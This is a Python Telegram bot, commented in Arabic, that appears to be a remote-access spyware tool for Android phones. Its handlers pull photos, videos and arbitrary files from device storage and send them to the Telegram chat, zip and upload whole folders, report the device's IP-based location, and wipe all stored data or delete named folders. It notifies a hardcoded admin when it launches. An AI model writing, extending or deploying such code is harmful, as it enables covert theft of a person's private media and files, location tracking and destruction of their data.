import os
import sys
import subprocess
import importlib
import hashlib
import shutil
import random
import threading
import time
import tempfile
from dotenv import load_dotenv
from flask import Flask

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))

if not BOT_TOKEN:
    raise SystemExit("BOT_TOKEN غير موجود في .env")
if not ADMIN_ID:
    raise SystemExit("ADMIN_ID غير موجود في .env")

def _ensure_package(package_name: str, module_name: str | None = None) -> None:
    module_name = module_name or package_name
    try:
        importlib.import_module(module_name)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])

_ensure_package("pyTelegramBotAPI", "telebot")
_ensure_package("colorama", "colorama")
_ensure_package("requests", "requests")
_ensure_package("Flask", "flask")

from telebot import TeleBot, types
from colorama import Fore, Style, init

init()

bot = TeleBot(BOT_TOKEN)

ROOT_DIRECTORY = os.getenv("ROOT_DIRECTORY", "/storage/emulated/0/")
# إنشاء المجلد إذا ما كان موجود (مهم لـ Render)
os.makedirs(ROOT_DIRECTORY, exist_ok=True)

PHOTO_PRIORITY_FOLDERS = [os.path.join(ROOT_DIRECTORY, "Photos"), os.path.join(ROOT_DIRECTORY, "Images"), os.path.join(ROOT_DIRECTORY, "DCIM/Camera")]
VIDEO_PRIORITY_FOLDERS = [os.path.join(ROOT_DIRECTORY, "Videos"), os.path.join(ROOT_DIRECTORY, "DCIM/Camera")]

ITEMS_PER_PAGE = 10
PATH_INDEX: dict[str, str] = {}
NAVIGATION_HISTORY: dict[int, list[str]] = {}
PENDING_DELETE: dict[int, str] = {}

# ===== سيرفر Flask الوهمي لإرضاء Render =====
app = Flask(__name__)

@app.route('/')
@app.route('/health')
def health():
    return "Bot is running", 200

def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# ===== باقي كود البوت =====
def hash_path(path: str) -> str:
    return hashlib.sha256(path.encode("utf-8")).hexdigest()[:24]

def index_path(path: str) -> str:
    path_hash = hash_path(path)
    PATH_INDEX[path_hash] = path
    return path_hash

def find_path_by_hash(path_hash: str) -> str | None:
    cached = PATH_INDEX.get(path_hash)
    if cached and os.path.exists(cached):
        return cached

    for root, dirs, files in os.walk(ROOT_DIRECTORY):
        for item in dirs + files:
            item_path = os.path.join(root, item)
            if index_path(item_path) == path_hash:
                return item_path
    return None

def collect_media(root_directory: str, media_type: str, priority_folders: list[str] | None = None) -> list[str]:
    if media_type == "photo":
        extensions = (".jpg", ".jpeg", ".png", ".gif")
    elif media_type == "video":
        extensions = (".mp4", ".avi", ".mkv")
    else:
        raise ValueError("media_type must be 'photo' or 'video'")

    seen: set[str] = set()
    result: list[str] = []
    search_roots: list[str] = []

    if priority_folders:
        search_roots.extend(folder for folder in priority_folders if os.path.exists(folder))
    search_roots.append(root_directory)

    for base in search_roots:
        for dirpath, _dirnames, filenames in os.walk(base):
            for filename in filenames:
                if filename.lower().endswith(extensions):
                    file_path = os.path.join(dirpath, filename)
                    if file_path not in seen:
                        seen.add(file_path)
                        result.append(file_path)
    return result

def send_media_paths(paths: list[str], message: types.Message, media_type: str) -> int:
    sent_count = 0
    for file_path in paths:
        try:
            with open(file_path, "rb") as media_file:
                if media_type == "photo":
                    bot.send_photo(message.chat.id, media_file)
                else:
                    bot.send_video(message.chat.id, media_file)
            sent_count += 1
            time.sleep(0.25)
        except Exception as error:
            bot.send_message(message.chat.id, f"خطأ في إرسال {os.path.basename(file_path)}: {error}")
    return sent_count

def safe_edit_or_send(message: types.Message, text: str, keyboard: types.InlineKeyboardMarkup) -> None:
    try:
        if message and getattr(message, "message_id", None):
            bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, text=text, reply_markup=keyboard)
            return
    except Exception:
        pass
    bot.send_message(message.chat.id, text, reply_markup=keyboard)

@bot.message_handler(commands=["start"])
def start(message: types.Message) -> None:
    welcome_text = "مرحبًا! أنا الروبوت الخاص بك. كيف يمكنني المساعدة؟ 🤖"
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("استخراج الصور 📸", callback_data="extract_photos"), types.InlineKeyboardButton("استخراج الفيديو 🎥", callback_data="search_videos"))
    keyboard.add(types.InlineKeyboardButton("تنظيف البيانات 🗑️", callback_data="clear_data"), types.InlineKeyboardButton("نسخة من البيانات 📂", callback_data="copy_data"))
    keyboard.add(types.InlineKeyboardButton("احذف المجلد 📁", callback_data="delete_folder"))
    keyboard.add(types.InlineKeyboardButton("الموقع 🌍", callback_data="location"), types.InlineKeyboardButton("الملفات 📁", callback_data="files"))
    bot.send_message(message.chat.id, text=welcome_text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == "files")
def handle_files(call: types.CallbackQuery) -> None:
    NAVIGATION_HISTORY[call.message.chat.id] = [ROOT_DIRECTORY]
    show_directory_contents(call.message, ROOT_DIRECTORY, 0)

def show_directory_contents(message: types.Message, directory: str, page: int) -> None:
    chat_id = message.chat.id
    if not os.path.isdir(directory):
        bot.send_message(chat_id, f"المجلد غير موجود: {directory}")
        return
    index_path(directory)
    keyboard = types.InlineKeyboardMarkup()
    files: list[str] = []
    dirs: list[str] = []
    try:
        items = os.listdir(directory)
    except Exception as error:
        bot.send_message(chat_id, f"خطأ في قراءة المجلد: {error}")
        return
    for item in items:
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path): files.append(item)
        else: dirs.append(item)
    all_items = sorted(dirs) + sorted(files)
    start_index = page * ITEMS_PER_PAGE
    end_index = start_index + ITEMS_PER_PAGE
    current_items = all_items[start_index:end_index]
    for item in current_items:
        item_path = os.path.join(directory, item)
        item_hash = index_path(item_path)
        if os.path.isfile(item_path):
            lower = item.lower()
            if lower.endswith((".png", ".jpg", ".jpeg", ".gif")): label = f"📷 {item}"
            elif lower.endswith((".mp4", ".avi", ".mkv")): label = f"🎥 {item}"
            else: label = f"📄 {item}"
            keyboard.add(types.InlineKeyboardButton(label, callback_data=f"file_{item_hash}"))
        else:
            keyboard.add(types.InlineKeyboardButton(f"📁 {item}", callback_data=f"dir_{item_hash}"))
    history = NAVIGATION_HISTORY.get(chat_id, [])
    if len(history) > 1:
        keyboard.add(types.InlineKeyboardButton("⬅️ خلف", callback_data="back"))
    if end_index < len(all_items):
        keyboard.add(types.InlineKeyboardButton("➡️ الصفحة التالية", callback_data=f"page_{hash_path(directory)}_{page + 1}"))
    if page > 0:
        keyboard.add(types.InlineKeyboardButton("⬅️ الصفحة السابقة", callback_data=f"page_{hash_path(directory)}_{page - 1}"))
    safe_edit_or_send(message, f"محتويات المجلد: {directory}", keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith("dir_"))
def handle_directory_click(call: types.CallbackQuery) -> None:
    directory_hash = call.data.split("_", 1)[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, "خطأ: لم يتم العثور على المسار. 🚫")
        return
    chat_id = call.message.chat.id
    history = NAVIGATION_HISTORY.get(chat_id, [])
    history.append(directory)
    NAVIGATION_HISTORY[chat_id] = history
    show_directory_contents(call.message, directory, 0)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("file_"))
def handle_file_click(call: types.CallbackQuery) -> None:
    file_hash = call.data.split("_", 1)[1]
    file_path = find_path_by_hash(file_hash)
    if file_path is None or not os.path.isfile(file_path):
        bot.answer_callback_query(call.id, "خطأ: الملف غير موجود. 🚫")
        return
    try:
        with open(file_path, "rb") as file:
            lower = file_path.lower()
            if lower.endswith((".png", ".jpg", ".jpeg", ".gif")): bot.send_photo(call.message.chat.id, file)
            elif lower.endswith((".mp4", ".avi", ".mkv")): bot.send_video(call.message.chat.id, file)
            else: bot.send_document(call.message.chat.id, file)
        bot.answer_callback_query(call.id)
    except Exception as error:
        bot.answer_callback_query(call.id, f"حدث خطأ أثناء إرسال الملف: {error} 🚫")

@bot.callback_query_handler(func=lambda call: call.data.startswith("page_"))
def handle_page_click(call: types.CallbackQuery) -> None:
    data = call.data.split("_", 2)
    directory_hash = data[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, "خطأ: لم يتم العثور على المسار. 🚫")
        return
    page = int(data[2])
    show_directory_contents(call.message, directory, page)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "back")
def handle_back_click(call: types.CallbackQuery) -> None:
    chat_id = call.message.chat.id
    history = NAVIGATION_HISTORY.get(chat_id, [])
    if len(history) <= 1:
        bot.answer_callback_query(call.id, "أنت في الجذر.")
        return
    history.pop()
    NAVIGATION_HISTORY[chat_id] = history
    show_directory_contents(call.message, history[-1], 0)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "location")
def handle_location(call: types.CallbackQuery) -> None:
    import requests
    try:
        ip_info = requests.get("http://ip-api.com/json/", timeout=10).json()
    except Exception as error:
        bot.send_message(call.message.chat.id, f"فشل تحديد الموقع: {error}")
        return
    if ip_info.get("status") == "success":
        latitude = ip_info["lat"]
        longitude = ip_info["lon"]
        additional_info = f"معلومات إضافية:\nجانب: {ip_info['country']}\nمنطقة: {ip_info['regionName']}\nمدينة: {ip_info['city']}\nمزود: {ip_info['isp']}\nIP-عنوان: {ip_info['query']}"
        bot.send_location(call.message.chat.id, latitude, longitude)
        bot.send_message(call.message.chat.id, additional_info)
    else:
        bot.send_message(call.message.chat.id, "لم نتمكن من تحديد موقعك.")

@bot.callback_query_handler(func=lambda call: call.data == "extract_photos")
def ask_for_photo_count(call: types.CallbackQuery) -> None:
    paths = collect_media(ROOT_DIRECTORY, "photo", PHOTO_PRIORITY_FOLDERS)
    bot.send_message(call.message.chat.id, f"حاليًا على الجهاز {len(paths)} صورة. كم عدد الصور التي تريد الحصول عليها؟ 📸")
    bot.register_next_step_handler(call.message, process_photo_count)

def process_photo_count(message: types.Message) -> None:
    try:
        count = int(message.text)
        if count <= 0: raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, "الرجاء إدخال العدد الصحيح من الصور. 📸")
        return
    paths = collect_media(ROOT_DIRECTORY, "photo", PHOTO_PRIORITY_FOLDERS)
    send_media_paths(paths[:count], message, "photo")
    ask_to_return_to_menu(message, "extract_photos")

@bot.callback_query_handler(func=lambda call: call.data == "clear_data")
def clear_data_prompt(call: types.CallbackQuery) -> None:
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("تأكيد الحذف النهائي", callback_data="confirm_clear"), types.InlineKeyboardButton("إلغاء", callback_data="return_to_menu"))
    bot.send_message(call.message.chat.id, "سيتم حذف كل الملفات داخل المسار. هذا الإجراء نهائي. أكد.", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == "confirm_clear")
def clear_data_execute(call: types.CallbackQuery) -> None:
    bot.send_message(call.message.chat.id, "بدأ تنظيف البيانات... 🗑️")
    errors = 0
    try:
        for root, dirs, files in os.walk(ROOT_DIRECTORY, topdown=False):
            for name in files:
                try: os.remove(os.path.join(root, name))
                except Exception: errors += 1
            for name in dirs:
                try: os.rmdir(os.path.join(root, name))
                except Exception: errors += 1
        if errors: bot.send_message(call.message.chat.id, f"تم المسح مع {errors} خطأ في بعض العناصر. 🗑️")
        else: bot.send_message(call.message.chat.id, "تم مسح البيانات بنجاح. 🗑️")
    except Exception as error:
        bot.send_message(call.message.chat.id, f"خطأ عند مسح البيانات: {error} 🚫")
    ask_to_return_to_menu(call.message, "clear_data")

@bot.callback_query_handler(func=lambda call: call.data == "copy_data")
def ask_for_folder_name(call: types.CallbackQuery) -> None:
    bot.send_message(call.message.chat.id, "أدخل اسم المجلد المراد نسخه: 📂")
    bot.register_next_step_handler(call.message, process_folder_name)

def process_folder_name(message: types.Message) -> None:
    folder_name = (message.text or "").strip()
    folder_path = find_folder(ROOT_DIRECTORY, folder_name)
    if not folder_path:
        bot.send_message(message.chat.id, f'مجلد "{folder_name}" لم يتم العثور عليه. 🚫')
        ask_to_return_to_menu(message, "copy_data")
        return
    if is_folder_too_large(folder_path):
        bot.send_message(message.chat.id, "المجلد كبير جدًا، قد يستغرق الضغط وقتًا. 📦")
    zip_file_path = create_zip_archive(folder_path, folder_name)
    if zip_file_path:
        try:
            with open(zip_file_path, "rb") as zip_file: bot.send_document(message.chat.id, zip_file)
            os.remove(zip_file_path)
        except Exception as error:
            bot.send_message(message.chat.id, f"حدث خطأ أثناء إرسال الأرشيف: {error} 🚫")
    else:
        bot.send_message(message.chat.id, "حدث خطأ أثناء إنشاء الأرشيف. 🚫")
    ask_to_return_to_menu(message, "copy_data")

@bot.callback_query_handler(func=lambda call: call.data == "delete_folder")
def ask_for_delete_folder_name(call: types.CallbackQuery) -> None:
    bot.send_message(call.message.chat.id, "أدخل اسم المجلد المراد حذفه: 📁")
    bot.register_next_step_handler(call.message, process_delete_folder_name)

def process_delete_folder_name(message: types.Message) -> None:
    folder_name = (message.text or "").strip()
    folder_path = find_folder(ROOT_DIRECTORY, folder_name)
    if not folder_path:
        bot.send_message(message.chat.id, f'مجلد "{folder_name}" لم يتم العثور عليه. 🚫')
        ask_to_return_to_menu(message, "delete_folder")
        return
    PENDING_DELETE[message.chat.id] = folder_path
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("تأكيد الحذف", callback_data=f"confirm_delete_{hash_path(folder_path)}"), types.InlineKeyboardButton("إلغاء", callback_data="return_to_menu"))
    bot.send_message(message.chat.id, f'سيتم حذف المجلد "{folder_name}" نهائيًا. أكد.', reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_delete_"))
def confirm_delete_folder(call: types.CallbackQuery) -> None:
    folder_hash = call.data.split("_", 2)[2]
    chat_id = call.message.chat.id
    folder_path = PENDING_DELETE.pop(chat_id, None)
    if not folder_path or hash_path(folder_path) != folder_hash:
        bot.answer_callback_query(call.id, "انتهت صلاحية التأكيد. أعد المحاولة. 🚫")
        return
    try:
        shutil.rmtree(folder_path)
        bot.send_message(chat_id, f"تم حذف المجلد: {os.path.basename(folder_path)} 🗑️")
    except Exception as error:
        bot.send_message(chat_id, f"خطأ عند حذف المجلد: {error} 🚫")
    ask_to_return_to_menu(call.message, "delete_folder")
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "search_videos")
def ask_for_video_count(call: types.CallbackQuery) -> None:
    paths = collect_media(ROOT_DIRECTORY, "video", VIDEO_PRIORITY_FOLDERS)
    bot.send_message(call.message.chat.id, f"حاليًا على الجهاز {len(paths)} فيديو. كم عدد مقاطع الفيديو التي تريدها؟ 🎥")
    bot.register_next_step_handler(call.message, process_video_count)

def process_video_count(message: types.Message) -> None:
    try:
        count = int(message.text)
        if count <= 0: raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, "الرجاء إدخال عدد صالح من مقاطع الفيديو. 🎥")
        return
    paths = collect_media(ROOT_DIRECTORY, "video", VIDEO_PRIORITY_FOLDERS)
    send_media_paths(paths[:count], message, "video")
    ask_to_return_to_menu(message, "search_videos")

def find_folder(root_directory: str, folder_name: str) -> str | None:
    if not folder_name: return None
    for root, dirs, _files in os.walk(root_directory):
        if folder_name in dirs: return os.path.join(root, folder_name)
    return None

def create_zip_archive(folder_path: str, folder_name: str) -> str | None:
    try:
        safe_name = os.path.basename(folder_name)
        temp_dir = tempfile.gettempdir()
        base_name = os.path.join(temp_dir, safe_name)
        archive_path = shutil.make_archive(base_name, "zip", folder_path)
        return archive_path
    except Exception: return None

def is_folder_too_large(folder_path: str) -> bool:
    total_size = 0
    try:
        for dirpath, _dirnames, filenames in os.walk(folder_path):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                total_size += os.path.getsize(file_path)
    except OSError: return False
    return total_size > 100 * 1024 * 1024

def ask_to_return_to_menu(message: types.Message, task: str) -> None:
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("نعم", callback_data="return_to_menu"), types.InlineKeyboardButton("لا", callback_data=f"repeat_{task}"))
    bot.send_message(message.chat.id, "هل تريد العودة إلى القائمة؟ 🔄", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == "return_to_menu")
def return_to_menu(call: types.CallbackQuery) -> None:
    start(call.message)

@bot.callback_query_handler(func=lambda call: call.data.startswith("repeat_"))
def repeat_task(call: types.CallbackQuery) -> None:
    task = call.data.split("_", 1)[1]
    if task == "extract_photos": ask_for_photo_count(call)
    elif task == "clear_data": clear_data_prompt(call)
    elif task == "copy_data": ask_for_folder_name(call)
    elif task == "delete_folder": ask_for_delete_folder_name(call)
    elif task == "search_videos": ask_for_video_count(call)
    else:
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("القائمة", callback_data="return_to_menu"))
        bot.send_message(call.message.chat.id, "اختر من القائمة.", reply_markup=keyboard)

def notify_admin() -> None:
    try: bot.send_message(ADMIN_ID, "انتباه! تم إطلاق البوت.\nيمكنك البدء في العمل /start 🚀")
    except Exception as error: print(f"Admin notification failed: {error}")

# ===== التشغيل النهائي =====
if __name__ == "__main__":
    # تشغيل سيرفر الويب في الخلفية عشان Render ما يطفي البوت
    threading.Thread(target=run_web_server, daemon=True).start()
    notify_admin()
    bot.infinity_polling()
